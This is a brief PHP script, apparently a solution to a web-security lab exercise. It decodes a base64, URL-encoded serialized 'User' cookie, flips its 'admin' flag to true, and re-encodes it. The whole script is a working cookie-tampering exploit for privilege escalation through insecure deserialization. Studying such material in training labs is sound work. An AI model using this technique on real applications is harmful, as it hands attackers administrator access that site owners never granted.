<?php

# set the serialized cookie
$serialized_cookie = "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d";
print "Serialized cookie: $serialized_cookie\n\n";

# URL decode cookie
$url_decoded_cookie = urldecode($serialized_cookie);
print "URL decoded cookie: $url_decoded_cookie\n\n";

# Base64 decode cookie
$base64_decoded_cookie = base64_decode($url_decoded_cookie);
print "Base64 decoded cookie: $base64_decoded_cookie\n\n";

# modify attribute
$modified_cookie = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}';

# modify attribute and encode cookie
$modifed_serialized_cookie = urlencode(base64_encode($modified_cookie));
print "Modified serialized cookie: $modifed_serialized_cookie";

?>